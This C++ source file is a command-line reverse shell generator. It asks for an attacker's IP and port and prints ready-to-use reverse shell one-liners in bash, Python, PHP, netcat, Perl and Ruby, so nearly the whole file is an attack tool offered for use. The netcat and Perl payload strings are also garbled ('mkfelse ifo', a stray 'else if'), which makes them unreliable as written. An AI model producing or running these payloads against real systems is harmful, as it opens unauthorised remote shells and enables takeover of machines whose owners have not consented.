#include<iostream>
#include<cstring>
#include<regex>
#include<algorithm>
#include<cctype>
using namespace std;


bool isValidIP(const string& ip);
int isValidPort(const int& portnum);


void printAsciiArt();
string bash(string ip, string port);
string python(string ip, string port);
string php(string ip, string port);
string netcat(string ip, string port);
string perl(string ip, string port);
string ruby(string ip, string port);
int main()
{

  printAsciiArt();
  int portnum;

  string n,t;
  string ip,port;
  std::cout<<"Choose an option from the menu below"<<endl;
  cout<<"1.python\n2.netcat\n3.bash\n4.php\n5.ruby\n6.perl"<<endl;
  cout<<"Your Input(in words) : ";
  cin>>n;

  std::transform(n.begin(), n.end(), n.begin(), ::tolower);

  if ((n!="python")&&(n!="netcat")&&(n!="bash")&&(n!="php")&&(n!="ruby")&&(n!="perl"))
  {
    cout<<"Invalid Input!\nexiting!"<<endl;
    exit(0);
  }

  std::cout<<"Enter attacker's IP : ";
  cin>>ip;
  if (!isValidIP(ip))
  {
    cout<<"Invalid IP\nexiting!"<<endl;
    exit(0);
  }
  std::cout<<"Enter listening port : ";
  cin>>port;

  try {
        portnum = stoi(port);
        if (isValidPort(portnum) != 0) {
            cout << "Invalid Port\nexiting!" << endl;
            exit(0);
        }
    } catch (const invalid_argument& e) {
        cout << "Invalid Port (not a number)\nexiting!" << endl;
        exit(0);
    } catch (const out_of_range& e) {
        cout << "Invalid Port (out of range)\nexiting!" << endl;
        exit(0);
    }


  if (n=="python")
  {
    cout<<"Your python reverse shell is  : "<<python(ip,port)<<endl;
  }
  else if (n=="netcat")
  {
    cout<<"Your netcat reverse shell is : "<<netcat(ip,port)<<endl;
  }
  else if (n=="bash")
  {
    cout<<"Your bash reverse shell is : "<<bash(ip,port)<<endl;
  }
  else if (n=="php")
  {
    cout<<"Your php reverse shell is : "<<php(ip,port)<<endl;
  }
  else if(n=="ruby")
  {
    cout<<"Your ruby reverse shell is : "<<ruby(ip,port)<<endl;
  }
  else if(n=="perl")
  {
    cout<<"Your perl reverse shell is : "<<perl(ip,port)<<endl;
  }



  return 0;
}

int isValidPort(const int& portnum)
{
  if ((portnum<=0)||(portnum>65535))
  {
    return 1;
  }
  return 0;
}

bool isValidIP(const string& ip)
{
  regex ipPattern("^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$");
  return regex_match(ip, ipPattern);
}

string bash(string ip,string port)
{

  string shell,s1,s2,s3,s4;
  s1="bash -i >& /dev/tcp/";
  s2=ip + "/" + port;
  s3=" 0>&1";

  s4=s1.append(s2);
  shell=s4.append(s3);
  return shell;
}

string python(string ip, string port)
{

string shell,s1,s2;
s1 = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"";
s2 = ip + "\", " + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'";
shell = s1 + s2;
return shell;
}

string php(string ip, string port)
{
  string shell,s1,s2,s3;
  s1="php -r '$sock=fsockopen(\"";
  s2=ip + "\"" + "," + port;
  s3=");shell_exec(\"sh <&3 >&3 2>&3\");'";
  shell=s1+s2+s3;
  return shell;
}


string netcat(string ip, string port)
{
  string shell,s1,s2,s3;
  s1="rm /tmp/f;mkfelse ifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ";
  s2=ip + " " + port + " " + ">/tmp/f";
  shell=s1.append(s2);
  return shell ;
}

string perl(string ip, string port)
{
  string shell,s1,s2,s3,s4;
  s1="perl -e 'use Socket;$i=\"";
  s2=ip + "\"" + ";$p=" + port + ";";
  s3="socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));";
  s4="else if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";
  shell=s1+s2+s3+s4;
  return shell;

}

string ruby(string ip, string port)
{
  string shell,s1,s2;
  s1="ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"";
  s2=ip + "\"" + "," + port + "))'";
  shell=s1.append(s2);
  return shell;
}


void printAsciiArt() {
    string asciiArt = R"(

      ######   ##  ##   ######   ##       ##       ######   ######   ######
      ##       ##  ##   ##       ##       ##       ##  ##   ##  ##   ##  ##
      ##       ##  ##   ##       ##       ##       ##  ##   ##  ##   ##  ##
      ######   ######   ####     ##       ##       ######   ##  ##   ######
          ##   ##  ##   ##       ##       ##       ##       ##  ##   ##
          ##   ##  ##   ##       ##       ##       ##       ##  ##   ##
      ######   ##  ##   ######   ######   ######   ##       ######   ##

                                              A reverse shell generator
                                              Made with <3 by EF3X0S.


    )";

    cout << asciiArt << endl;
}
